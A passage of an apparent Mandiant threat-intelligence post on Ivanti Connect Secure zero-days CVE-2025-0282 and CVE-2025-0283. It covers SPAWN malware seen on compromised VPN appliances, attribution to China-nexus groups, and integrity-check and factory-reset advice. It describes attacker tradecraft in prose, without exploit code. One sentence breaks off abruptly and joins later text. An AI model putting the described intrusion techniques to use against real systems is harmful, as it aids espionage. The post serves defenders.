See the Changelog at the bottom of this post for more details.\u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eOn Wednesday, Jan. 8, 2025, Ivanti disclosed two vulnerabilities, \u003c/span\u003e\u003ca href\u003d\"https://www.virustotal.com/gui/collection/vulnerability--cve-2025-0282\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cspan style\u003d\"text-decoration:underline;vertical-align:baseline\"\u003eCVE-2025-0282\u003c/span\u003e\u003c/a\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e and \u003c/span\u003e\u003ca href\u003d\"https://www.virustotal.com/gui/collection/vulnerability--cve-2025-0283\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cspan style\u003d\"text-decoration:underline;vertical-align:baseline\"\u003eCVE-2025-0283\u003c/span\u003e\u003c/a\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e, impacting Ivanti Connect Secure (“ICS”) VPN appliances. Mandiant has identified zero-day exploitation of CVE-2025-0282 in the wild beginning mid-December 2024. CVE-2025-0282 is an unauthenticated stack-based buffer overflow. Successful exploitation could result in unauthenticated remote code execution, leading to potential downstream compromise of a victim network.\u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eIvanti and its affected customers identified the compromise based on indications from the company-supplied Integrity Checker Tool (“ICT”) along with other commercial security monitoring tools. Ivanti has been working closely with Mandiant, affected customers, government partners, and security vendors to address these issues. As a result of their investigation, Ivanti has released patches for the vulnerabilities exploited in this campaign and Ivanti customers are urged to follow the actions in the \u003c/span\u003e\u003ca href\u003d\"https://forums.ivanti.com/s/article/Security-Advisory-Ivanti-Connect-Secure-Policy-Secure-ZTA-Gateways-CVE-2025-0282-CVE-2025-0283\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cspan style\u003d\"text-decoration:underline;vertical-align:baseline\"\u003eSecurity Advisory\u003c/span\u003e\u003c/a\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e to secure their systems as soon as possible.\u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eMandiant is currently performing analysis of multiple compromised Ivanti Connect Secure appliances from multiple organizations. The activity described in this blog utilizes insights collectively derived from analysis of these infected devices and have not yet conclusively tied all of the activity described below to a single actor. In at least one of the appliances undergoing analysis, Mandiant observed the deployment of the previously observed \u003c/span\u003e\u003ca href\u003d\"https://cloud.google.com/blog/topics/threat-intelligence/ivanti-post-exploitation-lateral-movement\"\u003e\u003cspan style\u003d\"text-decoration:underline;vertical-align:baseline\"\u003eSPAWN ecosystem of malware\u003c/span\u003e\u003c/a\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e (which includes the \u003ca href\u003d\"https://www.virustotal.com/gui/collection/malware--c8d0d8da-9573-563f-bd12-a605a6365956\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003eSPAWNANT\u003c/a\u003e installer, \u003ca href\u003d\"https://www.virustotal.com/gui/collection/malware--203afe3c-6cd5-503f-8e1a-918742ae9a29\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003eSPAWNMOLE\u003c/a\u003e tunneler and the \u003ca href\u003d\"https://www.virustotal.com/gui/collection/malware--d4926375-27b0-5012-8feb-27d341f2dbfc\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003eSPAWNSNAIL\u003c/a\u003e SSH backdoor). The deployment of the S\u003c/span\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003ePAWN ecosystem of malware following the targeting of Ivanti Secure Connect appliances has been attributed Finally, all instances of the \u003c/span\u003e\u003ccode style\u003d\"vertical-align:baseline\"\u003ecgi-server \u003c/code\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eprocess are killed in order for the modified \u003c/span\u003e\u003ccode style\u003d\"vertical-align:baseline\"\u003eDSAuth.pm\u003c/code\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e to be activated.\u003c/span\u003e\u003c/p\u003e\n\u003ch2\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eAttribution\u003c/span\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eMandiant has previously only observed the deployment of the SPAWN ecosystem of malware on Ivanti Connect Secure appliances by UNC5337. UNC5337 is a China-nexus cluster of espionage activity including operations that compromised Ivanti Connect Secure VPN appliances as early as Jan. 2024 and most recently as Dec. 2024. This included the Jan 2024 exploitation of CVE-2023-46805 (authentication bypass) and CVE-2024-21887 (command injection) to compromise Ivanti Connect Secure appliances. UNC5337 then leveraged multiple custom malware families including the SPAWNSNAIL passive backdoor, SPAWNMOLE tunneler, SPAWNANT installer, and SPAWNSLOTH log tampering utility. Mandiant suspects with medium confidence that UNC5337 is part of UNC5221.\u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eUNC5221 is a suspected China-nexus espionage actor that exploited vulnerabilities CVE-2023-46805 and CVE-2024-21887, which impacted Ivanti Connect Secure VPN and Ivanti Policy Security appliances as early as December 2023. Following the successful exploitation of CVE-2023-46805 (authentication bypass) and CVE-2024-21887 (command injection), UNC5221 leveraged multiple custom malware families, including the ZIPLINE passive backdoor, THINSPOOL dropper, LIGHTWIRE web shell, and WARPWIRE credential harvester. UNC5221 was also observed leveraging the PySoxy tunneler and BusyBox to enable post-exploitation activity. Additionally, Mandiant previously observed UNC5221 leveraging a likely \u003c/span\u003e\u003ca href\u003d\"https://cloud.google.com/blog/topics/threat-intelligence/china-nexus-espionage-orb-networks\"\u003e\u003cspan style\u003d\"text-decoration:underline;vertical-align:baseline\"\u003eORB network\u003c/span\u003e\u003c/a\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e of compromised Cyberoam appliances to enable intrusion operations. \u003c/span\u003e\u003c/p\u003e\n\u003ch2\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eConclusion\u003c/span\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eFollowing the Jan. 10, 2024, disclosure of CVE-2023-46805 and CVE-2024-21887, Mandiant observed widespread exploitation by UNC5221 targeting Ivanti Connect Secure appliances across a wide range of countries and verticals. Mandiant assesses that defenders should be prepared for widespread, opportunistic exploitation, likely targeting credentials and the deployment of web shells to provide future access. Additionally, if proof-of-concept exploits for CVE-2025-0282 are created and released, Mandiant assesses it is likely additional threat actors may attempt targeting Ivanti Connect Secure appliances.\u003c/span\u003e\u003c/p\u003e\n\u003ch2\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eRecommendations\u003c/span\u003e\u003c/h2\u003e\n\u003cp\u003e\u003ca href\u003d\"https://forums.ivanti.com/s/article/Security-Advisory-Ivanti-Connect-Secure-Policy-Secure-ZTA-Gateways-CVE-2025-0282-CVE-2025-0283?language\u003den_US\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cspan style\u003d\"text-decoration:underline;vertical-align:baseline\"\u003eIvanti recommends\u003c/span\u003e\u003c/a\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e utilizing their external and internal Integrity Checker Tool (“ICT”) and to contact Ivanti Support if suspicious activity is identified. While Mandiant has observed threat actor attempts to evade detection by the ICT, the following screenshots provide examples of how a successful scan should appear versus an unsuccessful scan on a device that has been compromised. Note the number of steps reported by the output.\u003c/span\u003e\u003c/p\u003e"]]],[null,null,null,null,null,null,null,null,[[[null,"\u003cp\u003eExternal ICT Scan - Successful\u003c/p\u003e"],["https://storage.googleapis.com/gweb-cloudblog-publish/images/ivanti-new-zero-day-fig1.max-1400x1400.png","https://storage.googleapis.com/gweb-cloudblog-publish/images/ivanti-new-zero-day-fig1.max-1100x1100.png 1060w, https://storage.googleapis.com/gweb-cloudblog-publish/images/ivanti-new-zero-day-fig1.max-1400x1400.png 1332w"," 1060px,  1332px","https://storage.googleapis.com/gweb-cloudblog-publish/images/ivanti-new-zero-day-fig1.max-1400x1400.png"],null,3]]],[null,null,null,null,null,null,null,null,[[[null,"\u003cp\u003eExternal ICT Scan - Unsuccessful (limited number of steps performed)\u003c/p\u003e"],["https://storage.googleapis.com/gweb-cloudblog-publish/images/ivanti-new-zero-day-fig2.max-1300x1300.png","https://storage.googleapis.com/gweb-cloudblog-publish/images/ivanti-new-zero-day-fig2.max-1100x1100.png 1060w, https://storage.googleapis.com/gweb-cloudblog-publish/images/ivanti-new-zero-day-fig2.max-1300x1300.png 1276w"," 1060px,  1276px","https://storage.googleapis.com/gweb-cloudblog-publish/images/ivanti-new-zero-day-fig2.max-1300x1300.png"],null,3]]],[null,null,[null,[null,"\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eIvanti also notes that the ICT is a snapshot of the current state of the appliance and cannot necessarily detect threat actor activity if they have returned the appliance to a clean state. The ICT does not scan for malware or other Indicators of Compromise. Ivanti recommends that customers should run the ICT in conjunction with other security monitoring tools which have detected post-exploitation activity. \u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eIf the ICT result shows signs of compromise, Ivanti recommends a \u003c/span\u003e\u003ca href\u003d\"https://forums.ivanti.com/s/article/Recovery-Steps\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003efactory reset\u003c/span\u003e\u003c/a\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e on the appliance to ensure any malware is removed and to then place the appliance back into production using version 22.7R2.5. \u003c/span\u003e\u003c/p\u003e\n\u003ch2\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eAcknowledgement\u003c/span\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eWe would like to thank the team at Ivanti for their continued partnership and support in this investigation.
